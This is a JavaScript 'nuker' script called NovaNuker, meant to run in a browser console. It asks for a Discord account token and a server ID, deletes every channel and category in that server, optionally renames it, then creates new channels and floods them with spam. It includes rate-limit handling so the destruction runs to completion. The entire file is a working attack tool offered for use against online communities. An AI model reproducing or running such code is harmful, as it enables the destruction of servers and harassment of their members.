const ServersWhitelist = ['1253237882303549512', 'your_whitelisted_server_id_2', 'your_whitelisted_server_id_3']; const waitForStartCommand = () => { console.log('%cNovaNuker', 'font-family: "Arial Black", Gadget, sans-serif; font-size: 36px; font-weight: bold; color: #BF40BF; text-transform: uppercase; letter-spacing: 2px; text-shadow: 2px 2px 4px rgba(0,0,0,0.3);'); console.log('%cNovaNuker will delete all Text Channels, Categories & will spam messages in a few channels.', 'font-size: 16px; color: red;'); console.log('%cType "start" to begin the Nuke process.', 'font-size: 16px; color: blue;'); const handleStartCommand = () => { const command = prompt('Type "start" to begin:'); if (command === 'start') { startExecution(); } else { console.log('Invalid command. Type "start" to begin.'); handleStartCommand(); } }; handleStartCommand(); }; const startExecution = () => { const token = prompt('Please enter your Discord token:'); const serverId = prompt('Please enter your server ID:'); if (!token || !serverId) { alert('Token or server ID cannot be empty. Script execution aborted.'); } else { if (ServersWhitelist.includes(serverId)) { console.log('%cThis server cannot be nuked.', 'font-size: 16px; color: red;'); alert('This server cannot be nuked.'); return; } const changeGuildName = confirm('Do you want to change the guild name?'); let newGuildName = null; if (changeGuildName) { do { newGuildName = prompt('Enter the new guild name:'); if (!newGuildName) { alert('Guild name cannot be empty. Script execution aborted.'); return; } // Validate guild name length and format if (newGuildName.length < 5) { alert('Guild name must be at least 5 characters.'); } } while (newGuildName.length < 5); } const channelName = prompt('Enter the name for the new channel:'); const messageContent = prompt('Enter the message to send in each channel:'); if (!channelName || !messageContent) { alert('Channel name or message content cannot be empty. Script execution aborted.'); } else { const handleApiRequest = async (url, options) => { let response = await fetch(url, options); if (response.status === 429) { const retryAfter = response.headers.get('Retry-After'); console.log(`Rate limited. Retrying after ${retryAfter} seconds.`); await new Promise(resolve => setTimeout(resolve, (parseInt(retryAfter) + 1) * 1000)); response = await fetch(url, options); } if (!response.ok) { throw new Error(`Request failed: ${response.status} ${response.statusText}`); } return response.json(); }; const deleteAllChannels = async () => { const response = await handleApiRequest(`https://discord.com/api/v9/guilds/${serverId}/channels`, { method: 'GET', headers: { 'Authorization': token } }); const channels = response.filter(channel => channel.type === 0 || channel.type === 2 || channel.type === 4); const deletePromises = channels.map(async (channel) => { const deleteResponse = await handleApiRequest(`https://discord.com/api/v9/channels/${channel.id}`, { method: 'DELETE', headers: { 'Authorization': token } }); console.log(`Deleted channel or category ${channel.name}`); return deleteResponse; }); await Promise.all(deletePromises); }; const createChannel = async (channelName) => { try { const createChannelResponse = await handleApiRequest(`https://discord.com/api/v9/guilds/${serverId}/channels`, { method: 'POST', headers: { 'Authorization': token, 'Content-Type': 'application/json' }, body: JSON.stringify({ name: channelName, type: 0 }) }); console.log(`Created channel ${channelName}`); return createChannelResponse; } catch (error) { console.error('Error creating channel:', error); throw error; } }; const sendMessageInChannel = async (channelId, messageContent) => { try { const sendMessageResponse = await handleApiRequest(`https://discord.com/api/v9/channels/${channelId}/messages`, { method: 'POST', headers: { 'Authorization': token, 'Content-Type': 'application/json' }, body: JSON.stringify({ content: messageContent }) }); console.log(`Sent message in channel ${channelId}`); return sendMessageResponse; } catch (error) { console.error(`Error sending message in channel ${channelId}:`, error); throw error; } }; const createChannelsAndSendMessages = async (totalChannels, messagesPerChannel, channelsPerBatch, batchDelay) => { try { const delayBetweenChannels = 200; const createdChannels = []; for (let i = 0; i < totalChannels; i++) { const channelNameWithNumber = `${channelName} ${i + 1}`; // Append number to channel name const channel = await createChannel(channelNameWithNumber); createdChannels.push(channel); await new Promise(resolve => setTimeout(resolve, delayBetweenChannels)); } for (let i = 0; i < createdChannels.length; i += channelsPerBatch) { const batchChannels = createdChannels.slice(i, i + channelsPerBatch); const sendMessagePromises = []; for (const channel of batchChannels) { for (let j = 0; j < messagesPerChannel; j++) { sendMessagePromises.push(sendMessageInChannel(channel.id, messageContent)); } } await Promise.all(sendMessagePromises); console.log(`Sent messages in batch of ${batchChannels.length} channels. Waiting ${batchDelay / 1000} seconds before next batch.`); await new Promise(resolve => setTimeout(resolve, batchDelay)); } console.log('All channels created and messages sent successfully.'); alert('All channels created and messages sent successfully.'); } catch (error) { console.error('Error:', error); } }; const changeGuildNameIfNeeded = async () => { if (newGuildName) { try { const changeNameResponse = await handleApiRequest(`https://discord.com/api/v9/guilds/${serverId}`, { method: 'PATCH', headers: { 'Authorization': token, 'Content-Type': 'application/json' }, body: JSON.stringify({ name: newGuildName }) }); console.log(`Guild name changed to ${newGuildName}`); } catch (error) { console.error('Error changing guild name:', error); throw error; } } }; const deleteAllChannelsCreateChannelsAndSendMessages = async () => { try { await deleteAllChannels(); await changeGuildNameIfNeeded(); const totalChannelsToCreate = 5; const messagesPerChannel = 30; const channelsPerBatch = 5; const batchDelay = 800; await createChannelsAndSendMessages(totalChannelsToCreate, messagesPerChannel, channelsPerBatch, batchDelay); console.log('All channels created and messages sent successfully.'); alert('All channels created and messages sent successfully.'); } catch (error) { console.error('Error:', error); } }; // Starting point after user confirmation deleteAllChannelsCreateChannelsAndSendMessages(); } } }; // Wait for user to type "start" in the console waitForStartCommand();
